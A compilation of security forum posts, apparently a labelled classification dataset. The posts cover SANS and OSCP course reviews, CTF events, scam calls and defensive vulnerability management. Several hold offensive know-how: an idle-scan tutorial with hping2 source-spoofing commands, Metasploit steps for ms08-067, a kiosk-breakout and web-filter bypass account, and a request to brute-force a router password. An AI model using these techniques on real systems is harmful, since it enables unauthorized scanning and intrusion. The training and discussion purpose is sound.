and paros. zap could interrupt http requests and responses to give an attacker a better view at what was happening behind the scenes of a web application.  in addition, it had web crawling capabilities so you can index the entire site to find more vulneraibilities that may not be visible at first glance. of course, it can scan the site directly to find xss, sqli flaws, private ip disclosure, indexable directories, and obsolete files.  it can also manipulate cookies to track if the web application will react differently.  this was a very big day in learning more web attack techniques that included cross-site request forgery (xsrf).  today, imo was the longest, most insightful day with the examples ed gave with each technique. at the end of the day, sans is hosting netwars. i did not get a chance to see it but i am sure i would have loved it. it seems to be a set of security challenges like capture the flag. i think this is the one drawback with attending the course through vlive.  you are not present for some of the additional speakers and programs that happen after the course is over for the day. the students that were in orlando, were about to sign up for netwars or at least view it.  it would be nice in the future if you can get the recording of netwars if you are connecting to vlive.      day 6 friday march 30th penetration testing workshop and capture the flag:   the last day of the course consisted of "capture the flag".  this was my first ctf btw, so i was very excited for this last day.  we were broken into teams of 5 people.  however, we did not have enough people who were connected through vlive so we joined up into one big team.  unfortunately, we did not capture the flag in time, but we were very close to coming in 2nd.  the exercise required for you to exam an environment, find encryption keys/files of 4 users of the network and to decrypt the files in order. we needed the last file decrypted by the time someone was declared a winner. i still had a great time however. the ctf included all the techniques that were taught in the course.  the ctf exercise illustrates to yourself how much you have actually learned and how big of an impact these techniques can have on an organization. the exercise allowed us to understand that we need to go step by step, recon, scanning exploitation and attacks. without the proper recon and scanning, you will not get anywhere when you try to exploit vulnerabilities and attack a system or organization. the game started at 9:00 am and ended at around 3:00 pm.  we were to treat the game as an actual pentest. it does create an atmosphere of a real pentest, just without the interaction with the client.  i think there were 3 teams that captured the flag at the end. i think the award was to get a signed copy of "counterhack" book. also, i received the cpe certificate of completion which amounted to 36 credits which helped me complete my cpe requirements for at least a year and half.  conclusion: i would recommend this course to anyone serious about becoming a pentester or any other security professional.  it gives many lessons that a security professional would learn during his/her every day responsibilities.  to be totally honest, i would recommend that you take this course in addition to the offsec oscp course.  i would not do them at the same time, of course, but i would take them both at some point. i think the complement each other well, in their approach to teaching the technical and "soft" skills which are needed to be a professional penetration tester. you will understand how to engage the client, determine what kind of test you will perform, investigate the company along with its weaknesses, and present a high quality report that the customer can use to make well-informed business decisions about the security of their assets. the major plus of the course is the fact that i can go back to the sans website and log back into the course.  then, i can watch each day of recording and not only watch the videos again but also, review what was talked about in the chat section between the vlive students and the moderators. the moderators also added information to the course such as links to important information that was discussed by ed skoudis. one negative would be that the missing audio or video will also be included in these recordings. however, as i said before, it did not impact the overall success of the teachings of the course. in addition, i will be taking the gpen exam in a few weeks. it is open book so all the books from the giac course should come in handy.  update: i took the gpen exam and i think the books are great assets to have during the exam. i think people would have a little trouble with some of the questions without the books from the course.  the exam is for 4 hours and there are a lot of rules on what you can and cannot bring into the room with you. i think it would be a good idea for giac group to talk to the companies proctoring, so they are sure what is actually allowed.  there is a lot of confusion there from what i experienced. do not take this exam for granted like i did.  it is a complete representation of the course and it will test all skills that you have learned in the course also. i think i just did not want to deal with multiple choice after taking offsec courses.  i did not even take the practice courses which i probably should have. well, if anyone is taking the gpen exam and would like a practice exam, just message me.  i only have two so first come, first serve. thanks again to don and ethicalhacker.net

1;Hacking own routeri there, i have router at home that i changed the admin password for fear of being hacked since i live on a big neighborhood. now i need to access the admin panel on the router to change some settings since my isp provided me with a bigger bandwidth. i obviously have physical access to the router and can obviously connect wireless or via cable.  normally a reset would be an option but not in this case since to actually have internet i had to configure the router. i had this written down but i lost the papper and now i dont remember how to reconfigure it since it has been done by a technician. i already asked my isp to send me someone again but they charge a ridiculous amount for the second time.  ive been searching online and it seems you can get the admin password to a router using hydra or medusa. i downloaded backtrack 5 and have been searching online how to do using it but i never really got how to do it since im very new in linux. so im here asking for help

0;Idle Scanning Tutorial (Scan a host through another host!)dle scanning           there is no doubt that information gathering is one of the topics that hackers are most required to master, this is constituted of active and passive scanning. it is believed that active scanning is an essential factor for a successful penetration testing project. while this is extremely powerful, it is also complex. hackers choose between different scanning techniques depending on the situation they are facing when mapping the network. moreover, hackers are mostly concerned about their identity exposition during this process. however, there are several techniques that have been developed to avoid this, one of the most significant methods is idle scanning, and it is considered as one of the stealthiest scan types, idle scanning can also expose targets through a trusted host. so what is idle scanning? how does it hide the attacker’s ip? and how is it performed?           idle scan is the process of detecting a target’s ports and running services through an idle host using spoofed ip address technique along with the observation of the id ip (identification ip) changes. this procedure is carried out successfully with the help of source address spoofing and identification detecting in the ip header. to understand this concept, the ip header will be examined, along with the identification and the source address fields and how they can be exploited in order to perform the idle scan.           this will be shown by analysing a simple syn scan type first, followed by an idle scan, a syn scan is known as a half open connection, the attacker will firstly send a syn packet using a scanning tool (example: nmap, hping2..etc) to the target as shown below. syn scan   next, a syn/ack packet is sent back to the attacker.             lastly, the attacker will end the connection with a rst packet (rst flag= 1).                      this scan type will obviously expose the attacker’s ip address to the target. now let us see how the idle scan differs from the syn scan. the first step of performing an idle scan is to find an idle host, speaking of which, what is an idle host? a host that is online and is not currently receiving or transmitting packets, for example, if you left your laptop on while taking a shower, at that time, your computer is at the risk of being an idle host, thus, taking the blame for a filthy scan attack! what are the reasons behind this?  step one-finding an idle host:           it is possible to determine whether or not the host is idle by analysing its identification field in the ip header.                                ip header   graph.1 hang on, what is the purpose of the identification field? it mostly contributes to the fragments implementation; this is accomplished by incrementing the id ip’s (identification) internal counter by 1 every time a datagram is sent over a network in order to avoid the confusions of datagram fragments. the operation system however is in charge of this. so, a host that increment by 1 is idle, this can be examined and caused by the attacker as shown below:   target’s id ip (identification ip) value = 1234, this is before the attacker sends interacts with the target (no packets are sent). syn scan   target’s id ip (identification ip) value = 1235? nope, it’s still 1234, the target did not send packets yet!                         target’s id ip (identification ip) value = 1235! the target sent a packet, so its id ip has incremented by 1.           this process is repeated couple of times to ensure that the target’s id ip is incremented by 1 (1235) every time a packet is sent, the value 1235 then is then placed in the identification field of the ip header, thus, an increase in the id ip by 1 means that the host sent a packet (in this situation the target is sending a packet back to the attacker). when repeating this process for a second time the id ip of the target will turn to 1236, and so on. in contrast, no change in id ip simply means no packets were sent, also, an increment of different values (example: +2 +6 +3..etc) just means that the host is not idle; it is receiving more than one packet at a time, therefore not suitable to be used as an idle host. testing identification tracing of an idle host in a lab:                     now a real example is performed using hping2 tool, for this lab, the attacker machine is backtrack 5, idle host machine however is windows7, and finally ubuntu is used as the main target. the aim here is to trace the id ip of the rst packet that is coming from the idle host to attacker.      hosts ips on this example:                                 idle host (windows7)   = 192.168.1.10                                 target (ubuntu)          =  192.168.1.14 one way to do this is to use the command: hping2 –s [ip] (in this situation the [ip] is the windows7 host) •	-s; sets the syn flag up.   graph.2 it can be clearly seen how the id ip is incrementing by 1, from 19695 to 19706 (11 packets), thus, this host can be used as a zombie (the term zombie is often referred to the idle host). after “identification ip” is analysed in theory and practice, it’s time to move on to the next step. step two-attacking the target through the idle host:           now it is possible to scan the target through the idle host founded, for the purpose of hiding our own ip address. although there is another powerful advantage of this development discussed later on. as mentioned before, “source address” is another factor that contributes to a successful idle scan beside identification ip, the goal here is to scan the target using the idle host’s ip address (ip spoofing). firstly, observations of the idle host’s id ip need to be noted, so, by first typing the corresponding command as mentioned before: hping2 –s [idle host ip] while this command is running on the idle host, a spoofed syn packet needs to be sent to the target using a specific port that we are interested in (the idle hosts ip is spoofed). to test this, run the command: hping2 –a [idle host ip] –s –p 23 [target’s ip] –c 1 •	-a; spoof source address. •	-p; destination port. •	-c; packet count (to control how many packets are sent). in other words, what we are really trying to do is recording the idle host’s id ip, while sending a group of spoofed syn packets to the target at the same time, remember the main goal is to determine the status of a port on the target without exposing the attacker’s ip address, graph.3 shows this process:   graph.3 next, if the port we are examining (23 in this case) exists on the target, the target will respond to the idle host with a syn/ack packet as shown in graph.4   graph.4 note that until this stage, the idle host’s id ip is increasing by one every time a rst packet is sent to the attacker. from graph.4 the idle host received an unexpected syn/ack packet from target, graph.5 shows how the idle host deals with this situation.   graph.5 as it can be seen in graph.5, a rst is sent to the target as well to the attacker, this will cause the id ip of the idle host to increase by 2 (4114), and thus, an increase by two indicates that the port we are testing is open, what would happen if the port is closed? you guessed it right! the idle host in most cases will receive a rst packet, as a result the id ip of the idle host will continue to increase by 1 only, in addition, if the port is filtered, the target will not send any packets back to the idle host, hence, id ip will have +1 increase. the analysis shown in graph3, graph4, and graph.5 will be summarized and shown in action. after the idle host is founded by the steps mentioned earlier, the id ip of the idle host is noted, and at the same time a spoofed packet is sent to the target, the following results are the outcomes of two commands: hping2 –s [idle host ip] hping2 –a [idle host ip] –s –p 23 [target’s ip] –c 1   graph.6 note: (192.168.1.10 is the idle host’s ip, 192.168.1.14 is the target’s ip.) by looking at the id field in the graph, it can be concluded that the port 23 is open in the target host, the id field (id ip of idle host) is increasing by 1 from 29957 to 29961, then it is incremented by two in the next packets id ip (29963), note that 29962 is missing because two rst packets are sent from the idle host to both attacker and target. in conclusion, this scan type can have a huge effect when it comes to stealth scanning. additionally, this is not the only advantage of this scan type, as it can be also used to identify a host, through a trusted host (example: printer to a server or a workstation). however, this tactic is blocked sometimes by firewalls, and a few of new linux operation systems, yet evading those is still possible, the next tutorial will discuss how firewalls, and trusted hosts are included in idle scanning

3;Malware via Social Engineeringave gotten several calls from residential customers who get phone calls from scammers pretending to represent norton or microsoft. one woman was very scared that hackers got into her system, even though she hung up and never did anything with her pc.  the other customer fell for it. the scammer convinced her that he was from microsoft, and that her pc was hacked. so she turned it on and went to the website he directed her to, and he established a remote session using showmypc. he then told her all her files were corrupt, and scared her by showing event log entries. then he wanted her to go to western union send him $25. she refused and he hid her desktop icons, and hung up. she thought she lost everything and called me in a tearful panic.  shes all cleaned up now, and better educated about phone scams i hope.  those of you who support end users, do you get calls like this? ive seen videos posted by other forum members of pentesters using similar se techniques to trick corporate users who should know better, pretending to be the help desk, or similar. do you find that these sort of methods work better / faster than vulnerability scanning and exploitation? or do you do both, and report the technical issues and the se issues
0;OSCP - Critiqueell, i passed. and when i got my e-mail my first thought was...thank god its over! id read a slew of reviews about the course before signing up but what i read and tried to prepare myself for just did not match the reality. sure, theres a ton out there warning that this course requires a ton of extra work, self study, and is intense, etc. but really, does  "getting shot really hurts"  or  "rectal examinations are really uncomfortable"  adequately describe the real thing? i spent a couple of months working through the labs. i work full time so almost every minute i wasnt at work was spent on my computer, in the labs. weekday evenings? oscp. weekends? oscp. kids activities? sometimes. house maintenance? television? ha! oscp was present in damn near every waking moment of my life. as i waited for my exam day, i looked forward to getting my life back.  the oscp doesnt so much teach you as it tests you. based on my experience, i would say that oscp was 50% instruction, 45% learn on your own, 5% getting hints from other students. something that occurs to me is that most books ive used to learn the subject matter are high on content but low on the ability to apply/practice that knowledge. that is, most of them gave me a wealth of info/techniques but no practical/legal way to practice. oscp is the opposite. you have a great playground but need to find/develop the info/techniques yourself. i learned a ton. enough to make my eyeballs explode out of my head; i can thank offsec for that. i can also say that theres room for improvement. (i am kind of surprised there was no student feedback form after my lab/exam, i thought that was pretty standard for most courses/certs.) anyway, there are so many positive reviews out there, 99% probably, so my review points out things that i didnt like or think need improvement. for that reason, it may come across as overly negative and/or critical but i want to state unequivacably that this is not a bad cert. imho, its just not for everyone.   this cert was particularly challenging for me because im not a pentester and this is only my second security cert (the other being ceh). i do have a lot of coding experience and have worked with/around computers since graduating college but i had to work my ass off for the oscp. anyway, for someone looking at the oscp for the first time, there are tons of positive reviews out there, dont base your opinion on my experience, check the others out. entry-level redefined ----------------------------------- i pulled this from the offsec website: penetration testing with backtrack is an  entry-level  course but still requires students to have certain knowledge prior to attending the class. a solid understanding of tcp/ip, networking, and reasonable linux skills are required. i think when most people hear "entry level" they think of their grade school algebra course, or beginning physics, or something similar. for me, the oscp was about as entry level as calculus & quantum mechanics are entry level mathematics & physics. really, the first clue should be: 24 hour exam. i initially thought this course was for the neophyte pentester, someone who wanted to break into the field. however, as i progressed through the material and labs, i started to wonder. on one hand, much of the material and some of the lab machines require experience/knowledge far beyond what it provided by the training. conversely, in other cases the instructions seem very much geared toward a novice pentester and were presented in a very simplistic, detailed, and easy to follow manner. again, and ill probably repeat this many times, a pentester might have looked at stuff i struggled with and said, "everyone knows that!!!!"  for an entry level course, the oscp is decidedly uneven, instructionally speaking. initially it starts out very basic going so far as to tell you how to start an ftp server. progress through the buffer overflow section is equally precise and easy to follow. one big help is your own box to experiment on, one not accessible by anyone but the student. that way if something doesnt work, you can rule out another student or leftover exploits. however in the latter modules, the instructional quality falls off dramatically as does the ability to practice techniques using the xp client youre provided. for example, the port forwarding section isnt covered well at all and youre given no ability to practice outside of the student lab machines.  next, while the course covers most of the stages of penetration testing individually, its up to the student to put them together. this means the student has to feel his way though the labs on his own. the danger in this is that the student may be learning things in a less than correct manner. maybe its just me, but "i learned most of what i know on my own through blogs and wikipedia," is not what i want to hear from my doctor or financial planner.    the labs ----------------------------------- the labs are the shining part of this cert. a veritable playground where you can hone your skills without fear of the fbi or other law enforcement agency banging down your door. its easy to freeze a service or machine as you sling exploits at it and being able to revert a particular server to its original state was critical. i wish that we were given more than 6 reverts in a 24 hour period. one thing i discovered while rooting boxes is that other students failed to clean up after themselves. so id get on a box and discover left over exploits or services open that werent intentionally left open. so i got into the habit of reverting a box before i started to really work on it. problem was, if i used a revert or two on it as i worked it (easy to do on some of the more fragile services), id be out of reverts in no time.  another problem i had with the labs was that there was no clear route to what is attainable at a given stage. realistically, most working folk will probably only be able to complete 1-2 modules per week. so your average student will be able to start getting shells and rooting machines by the 3rd week or so. so im banging my head against one machine - you know "try harder" - for hours, days even, only to find out (thanks to a helpful student on irc) that im not going to be able to get that machine until i get through module x. great. also some of the servers seemed spookily unaligned with a 101 class. say youre in algebra 101 and at the end of chapter 5 they tell you to do the exercises but, by the way, to make things challenging, we threw in some geometry, trig, & calculus questions. good luck! the big problem is that you dont know if the machine youre banging your head on is an algebra question or a calculus one. try harder will likely not cut it either. i can throw a 5th grader a quantum physics question and tell him try harder all day but it aint going to cut it. the training also lacks a full on end to end example. youre given the basics of each fundamental step of the process (scanning, enumeration, etc) but never given a run through of the getting into a box, why this exploit was chosen over that one, why this payload did work while that one didnt, etc, etc. unfortunately, what ended up happening with me, at least initially, is point-shoot-miss, point-shoot-miss, point-shoot-hit. battleship anyone? the material ----------------------------------- the muts videos were excellent. the problem i had was that they often were used to supplement the pdf rather than complement it. early on, i found holes in the manual that cost me hours, only to find out that the video got it right. i find it easier to reference a manual than a slew of videos so i wish the manual were a bit more thorough and the videos were used to add that extra bit rather than fill in the gaps. i was disappointed by the number of errors in the lab manual. for example the manual is all about using ollydbg but in the exercise lab provided, its immunity debug. are they similar/same? yes. but for the amount of money it costs, is it too much to ask for updated screen shots in a pdf? i could see if they referenced a tool from bt 4 that changed in bt 5 or if we were shipped a printed manual...but a pdf? case in point, a line of python code from the book:      code: print “fuzzing ” + command + " with length:" +str(len(string)) and the (supposed) corresponding output:     code: fuzzing mkd:1 doesnt take a programming genius to see theres something not right here. these admittedly minor quibbles are quality control issues that i wouldnt even bring up if it were a $30-$50 textbook, but for a $800 class? one thing that could alieviate these issues is if offsec were to implement system where students/instructors could post errata to the manual/videos. might save some questions in the irc as well. what saved me ----------------------------------- as ive repeated over and over, im not a pentest professional and a lot of networking concepts were foreign to me. what i did have going for me was a strong programming background. i think thats the key to getting through this course and the exam: being strong in a key discipline. it doesnt necessarily have to be programming or networking or pentesting.  but if you just learned that python wasnt just a big snake, bourne shell isnt the name of the next ludlum movie, and sql isnt someones misspelling of a movie follow-on...pain x 1000. i cringe when i read posts/hear from people who think that oscp is intro to hacking where they will come out like neo or the guy in swordfish. again, this is largely a self-taught class that requires you to learn so much on your own, primarily using the web as a resource.  another thing that helped me was having taken the ceh. while im the first to point out the negatives of ceh, it did at least introduce me to some of the basic points of the field. id recommend anyone taking this course to at least get a intro to ethical hacking book first. cost ----------------------------------- no, not the $$. im talking about the personal toll this class took on me and my family. (again, a pentester probably wouldnt have to devote as much time, so my experience might have been on the extreme side.) im normally pretty active, but at the end of this cert id gained 6-7 lbs. not surprising since weeknights and weekends were spent in front of the computer and when it came to eating id typically shove whatever was handy down my piehole. who has time to cook? did i mention i was spending 20+ hours a week on this cert? also, midway through, i started to break out and developed a cold due largely to the aforementioned eating habits & inactivity coupled with loss of sleep, and stress. obviously my work suffered - when youre staying up until 1 or 2 am working a server or waking up at 3 - 4 am thinking about a server...concentrating on your day job is difficult.  because i found it impossible to concentrate with the usual household noises, i had to closet myself in my office at home. so for more than 2 months, i barely saw much less spoke to my family. when my folks would call, i was usually distracted, tired, and/or busy. family get-togethers, weekend bbqs? ha, dont make me laugh. and when they did see me, i was often grumpy from lack of sleep or frustration. of course this all did not make the spousal unit happy. you can only say, "itll be over soon" so many times.   i have to give my spouse & kids credit - they were very understanding and supportive. but there were of course several times when being ignored for several months caused some spousal tension. more than once, pleas for attention from the wife turned decidedly frosty when met with, "hold on, ive almost got this server." and theres no guilt trip like having your kids tell you, "daddy, we miss you" and your wife say, "i want my husband back"...i owe them - my wife in particular - big time.   post mortem ----------------------------------- the challenge in any course is finding the right balance between hand holding and letting the student work things out for themselves. spoon feed <--------------------------------------> heres the book, exam in 8 weeks, later! i think most people will agree that the oscp falls closer to the right than the left.  imho, too much to the left doesnt benefit the student because youre not engaging any brain cells. too much to the right...theres more of a chance that a key concept or skill is overlooked. let me clarify that.  for me, figuring stuff out on my own improves my  retention ; it does not equate to learning "better", i.e. a thorough understanding. i think getting trained by an expert typically beats the learn on your own method. whatever i did in the labs, i know there are probably easier or more efficient methods, things i didnt think of. there are a couple of services that i was never able to crack...does this mean they just werent vulnerable or did i miss something? no idea.   i once missed a week in my college statistics class and ended up having to teach myself a chapter over a weekend. what i discovered the next week was that assumpions i had made (or divined), even though i got the right answer, ranged between inefficient and incorrect...thankfully, there was an instructor there to correct my shortcomings. this is why i feel the oscp wasnt an ideal fit for me. learning any skill can be made difficult; i could make learning the alphabet difficult. and none of what i learned in the oscp (either from the materials or on my own) qualifies as rocket science. but the amount of training is nowhere near what i needed in the labs - i estimate i got less than 50% of what i needed for the lab machines. i personally think a little more instructional information ("try harder" does not qualify) would improve the quality of the student. not only that, it might result in an increase in enrollment. it would be interesting to find out what percentage of oscpers take the osce/ee. my guess is its around 15% but wouldnt be surprised if it was actually < 10%. based on my canvasing of oscps at work, 1 in 8 (and he was a maybe) would consider the osce due to the impact it takes on the individual, his family, time, personal life, work...all of the above. most give me an unequivicable "no" (usually preceded with "h3ll" and "f@cking") re. osce or higher. the irony here is that the very thing that makes the oscp so sought after also seems stunt enrollment in the other courses.  i am still interested in ethical hacking but count myself in the "hell no" category when it comes to continuing the offsec curriculum. personally, i prefer something closer to "taught" than "tested". i want something where core concepts/methodology are stressed and theres more of a balance between spoonfed & "youre on your own". until then, i can teach myself using the web/blogs/books/sites (like eh.net)...just like i did with the oscp (only minus the labs.) so unless theres a pervasive reason to obtain the cert - maserati/g6/magic genie - i cant justify putting myself much less my family through another round
3;CC Cure teams up with CDMccure and cyber defense magazine form strategic partnership cdupuis writes " my good friend who many of you may know by name, gary s. miliefsky, has started his own magazine.  as you may know he has been a lead cover story writer for hakin9 for the past few years among many other activities in our field.  i am very excited to have establish a partnership with cyber defense magazine (cdm).  gary was one of my students dozen of years ago,  even at that time he was a forward thinker,  he was showing us an appliance he built to do vulnerability scanning and detection on networks,  at the time the concept seemed a bit nebulous but today it is a common practice.  thats how far ahead hes always thinking. his new publication is cyber defense magazine (cdm) and it includes a monthly email newsletter called cdm - cyber warnings.  the question is always,  whats the price of all of this? the answer is simple, the digital edition is free.  you can sign up for the magazine and the monthly emails at no cost.  if you want a print edition of the publication, theres a reasonable subscription fee, but why not just get the free edition?  no strings attached. cdm has also established a partnership with the university of massachuset (umass),  gary has started the cyber defense test labs (cdtl) to perform independent lab reviews of next generation infosec products for his new magazine.  i know this magazine is going to be very high quality because gary has a great deal of hands-on experience in this field.  he is a member of isc2.org, cissp® and advisory board of the center for the study of counter-terrorism and cyber crime at norwich university.  a dynamic speaker, he has presented at two white house summits on cyber security, the rsa conference, csi, and many others.  gary served as an informal advisor to president clinton and helped the presidents critical infrastructure protection board, under the bush administration, which is now known as the national infrastructure advisory council (niac) and operates within the u.s. department of homeland security, in their development of the national strategy to secure cyberspace.  gary is a founding member of the us department of homeland security ( http://www.dhs.gov ), he currently serves on the advisory board of mitre on the cve program ( http://cve.mitre.org ) and is a founding board member of the national information security group ( http://www.naisg.org ). cyber defense magazine is focused on best practices, new ideas and innovations and next generation infosec companies that are on the cutting edge at solving problems in information security.  as gary told me his publication is less worried about the balance sheet of an innovator and more about how well their technology works to solve critical security problems for our members and readers.  this is philosophically different from other publications that focus on cisco, microsoft, ibm, symantec, mcafee, etc. who are found to be more vulnerable, every week with holes listed on the cve site at mitre.  i like this approach and cant wait to see who gary and his team of writers think are the ‘innovators.  he gave me a sneak peek of whats coming in the january edition: january edition     rsa conference 2013 special edition     cdtl anti-virus & mobile security product reviews     cyber crime, cyber war predictions     cloud and mobile computing     government regulations and     crossing the distribution chasm and much more... together, well be sharing information, authoring content, and helping lead it professionals to cccure.org quizzes and online resources. please visit cyber defense magazine – your premier source for it security information and signup today for your always free electronic subscription to the excellent monthly newsletter and quarterly editions of the magazine
1;CTF365 – Capture The Flag Next Generation in Cyber-war Gametf competitions are the most efficient ways to learn defensive and offensive security. challenges come in different flavors for a vm with different vulnerabilities and levels. each level drives you to next level until you complete all tasks.  moreover, you can join teams and play against each other. team members have to gain access to other servers while defending their own server. some ctf competitions have complex scenarios. for example, mimicking a company with an online business and defending it from other teams. or a scenario where you have to laundry money without being caught. ctf competitions are all over the world and you can find them at infosec conferences like blackhat, defcon, cs faculties, online companies like stripe, mozilla, etc. ctf pros there are invaluable advantages to competing besides security training. ctfs are fun. they help recruit new talent, do some team building, improve critical response in your business and more. ctf cons any good thing comes with bad things too. ctfs are held yearly all over the world for short period of time, far from the real world internet (e.g. no dos or ddos attacks allowed). most of them fall into oblivion, even though they are fun. ctf365 – prepare your tools, build your team, defend your country while conquer the world. we at ctf365 decided to change ctf competitions for the better and we promise to blow your expectations. well simply build an internet within the internet where everything will be possible. well, almost everything. routers, switches, networks, dos or ddos attacks, you name it. ctf365 is world of warcraft for hackers except that instead of fighting in a fantasy world, with imaginary powers against imaginary characters, ctf365 will replicate the real world as much as possible, and you will have to fight with your own real tools... hacking tools. trackback, metasploit, nmap, backbox linux or whatever you choose to use as weapons. you will have your own fortress (your own server) to defend, with your own network, routers, and switches. you will build your own team and we will provide you with rttk – red team tool kit for team communication and many more features.  there will be as few rules as possible trying to get to the perfect cyber wargame: no rules at all. ctf365 it is a five stars training ground arena for infosec industry crafted for hackers, system administrators and security specialists, security students, red teams and cert professionals and a must have for every infosec conference. you can take a look at  ctf365  and tell us what you think. cheer

0;Finding the right exploitey, i was working in a lab trying to pwn a given host, so i more or less did the following: 1) ran nmap: may ports are open 2) ran nessus: ms08-067: microsoft windows server service crafted rpc request handling remote code execution (958644) (uncredentialed check) 3) metasploit: search ms08-067 4) metasploit: use exploit/windows/smb/ms08_067_netapi so this was pretty easy. this host was so full of holes that i could have probably used many other exploits (nessus found 22 red ones...). but i then tried to figure out how nessus was able to find this vulnerability and this is where i hit a wall... i was able to easily find the os and open ports like these:     code: os: microsoft windows 2000 sp3/sp4 or windows xp sp1/sp2 (95%) port     state service         version ------------------------------------------------------------------ 135/tcp  open  msrpc           microsoft windows rpc 139/tcp  open  netbios-ssn 443/tcp  open  https? 445/tcp  open  microsoft-ds    microsoft windows 2000 microsoft-ds 1031/tcp open  msrpc           microsoft windows rpc 1035/tcp open  msrpc           microsoft windows rpc 1037/tcp open  msrpc           microsoft windows rpc ... does this nmap output tells you something like: "thats obviously a ms08_067_netapi vulnerability that we have here!". for me, without nessus, i would have never tried this exploit...  so what approach do you guys use? do you have a set of very powerful exploits that you try at targets that simply match the os and maybe a port? or is there some voodoo that you can do to go from this nmap output to this exploit? i found more details about it at  http://www.metasploit.com/modules/exploit/windows/smb/ms08_067_netapi i feel like a script kiddy now..
0;[guidance needed] Am I doing it wrong?ey fellas, can you please explain smth to me? there is this vulnerability: code: â  â  code: http://technet.microsoft.com/en-us/security/bulletin/ms12-020 it explicitly says that it allows for remote code execution. however when i search in exploit-db for that cve i get an exploit which does dos on my lab and crashes the system, and its also categorized as dos in metasploit. so how is this arbitrary code? all over the net when looking at notes of this vulnerability, it specifically says the attacker who exploits it can create users, get information etc. am i missing something?  i am trying to get shell..ultimatel
1;Noob needs some help!  Getting started in CEH - hacking at work...ello all, first of all, i apologize if this is in the wrong location/forum, or totally inappropriate to ask.  i checked around, but didnt see anything explicitly wrong with this.  i also apologize in advance for the length, and really appreciate any help! i am 25 and have been on computers since i was 8.  i am pretty advanced in computers and currently have several mcpds for development (i know- c# sucks or whatever)...  i know a good bit about networking and administration, but have never really had my own environment to mess around in.  i hope to change that soon and setup a v-farm at home to test around in.  i have always been really interested in security while programming, and try to test programs our companies develop to make sure at least there is some level of security in their logic, authentication, and authorization procedures.  my end goal is hopefully to gain enough knowledge in the networking and infrastructure area that i can take the ceh. so enough of the back story, here is my current situation.  i am really the only one at my company of 150 that really knows more than the average person about security, and as such, was asked by one of our pms to try and hack a solution that our core infrastructure team had built.  the solution was meant to provide a secure testing environment that allowed access to only 1 website, and 1 website only.  the main blocks were to make sure that the audience could not access other internet, email, or system resources.  the solution is basically a wyse zero client, in a specific vlan that all traffic then goes through a barracuda filter.  the wyse client connected to citrix receiver and connected to a windows 7 enterprise vm. the first time i had a hack (pun not intended) at the system, i was actually able to achieve all of the tasks of accessing system files, accessing internet sites, and sending emails.  the environment had been secured by group policy: 1  - 1 icon on desktop for ie directly linked to testing site 2  - start menu reduced to logoff/disconnect, windows security button, and link to testing site 3  - start menu search/execute/address bar non-functional 4  - win+e disabled 5  - win+r disabled 6  - ctrl+alt+del only allowed logoff or cancel 7  - ctrl+shift+n disabled on desktop (attempt to get into fs) 8  - initial browser had 0 toolbar, however opening via desktop gave address bar/toolbars 9  - all web browsing not on testing site blocked  so initially, i accessed the filesystem via shell:system in the address bar.  even though the drives had been restricted access via gp, i could still use that to get into sys32, and then anywhere.  cmd, mmc, all control panels, taskmgr, etc, were completely locked down.  if i had spent more time, i would have tried to maybe use a bat file (i could open notepad/mspaint/etc low risks) to replace a service file so that it would elevate permissions, but i was limited on time so didnt get to test that. the next thing i did was to use the address bar in ie to navigate to one of googles ips (yeah, i have some blocks memorized).  i figured that they might only be blocking dns lookup.  trying to access  http://74.125.224.0/  resulted in a block page, however knowing that google now provides a https option, i changed the protocol to that, and was successfully on the internet.  i was able to access web proxies via ip and get into gmail and send an email. this was my first real hacking attempt for work, and not even really so - it was simple stuff really.  but that didnt stop me from being ecstatic.  well, after i gave them my report, they worked on securing alot of the vm and had me give another go at it today. they had gone and hidden the address bar and toolbars from ie via gp, and i couldnt get them back at all, even via the desktop shortcut.  none of the key shortcuts for open url... worked.  i was about to call defeat (even though i figured they still hadnt blocked ip navigation) when i remembered about the ie shortcut for navigating to copied url.  i typed the same ip as earlier for google into a textbox on the website, copied it, and then pressed ctrl+shift+l, and i was at google.  i was also still able to access shell:system.   after i finished my go at it today, i think i finally got it through their heads that they need to only allow ips for the testing site, and block all others.  they are also working on trying to disable the ctrl+shift+l shortcut, so that takes away one of my navigation bars right there.  the other one that i got to was the download box (ctrl+j) and was able to click options>>browse, but they are disabling that box as well. as i said, i am a total noob to this, and dont really have a ci background.  i know what a barracuda filter is, but thats about it.  i have messed around with gp a bit, but i am by no means an expert.  so, i come to you.  i am now 2 for 0 and very excited.  i would love to try and get through 1 more time and be successful.  i will have my chance soon, but after they make these changes, i am not sure what else i can do.  what other ways are there to get to an address bar so that i can access system resources or attempt direct navigation to sites.  if they setup the barracuda as i said, is there any way that you can think that id be able to defeat it?  the only thing i had though (only because i think the ci guy said blocking by hostheader) was to be able to somehow add a hosts entry or similar to map the testing domain to something like googles ip...  that should only work if they didnt do it correctly - or at least thats what i think.  i have done lots, and am sure i have forgot some things here, so if you have any questions or suggestions on whatelse i could attempt, i would be greatful! thanks
1;Looking at vulnerability assessments strategically from a defence sideam trying to come up with some security best practice "maintenance and monitoring" procedures in light of 3rd party penetration testing report, and i was hoping for some expert pointers. basically a 3rd party comes in once per year to do a full vulnerability assessment and penetration test of all our servers and devices attached to our network. albeit i am not the most technical, i myself can see there are always common themes in their findings (i.e certain software/services missing patches, silly stuff like weak/default passwords, plain text services, systems not adhering to best practice hardening guides, devices that dont adhere to the golden build for the given system role, open shares on servers with sensitive data, stale ad accounts that havent been disabled etc etc etc. my view on the pen testing/vulnerability assessment reports is the response to them seems to be pretty reactive, i.e. the internal it team addresses the findings as and when they are made aware of them, aka security firefighting. my personal theory is that for every vulnerability found there is a root cause/lack of security procedure as to why this vulnerability was evident in the network. rather than have the pen testers come in 12 months later and scan all the new servers and find the exact same types of vulnerability again and again and again â i feel strategically we should look how these issues came to be, and how we can prevent them from them occuring again â preventative measures, or failing that detective measures to find them ourselves on regular basis. are there any useful best practice guides for internal security/it teams that can prevent 99% of the security issues a 3rd party would find through effective security standards and maintenance/monitoring. sort of a root cause for each type of vulnerability/security weakness, and some strategic best practices how to prevent them ever happening again, i.e. the security standards, and pro-active maintenance and monitoring tasks required to keep your network vulnerability free. i dont really know how to phrase what this kind of checklist would be so any guidance most welcome
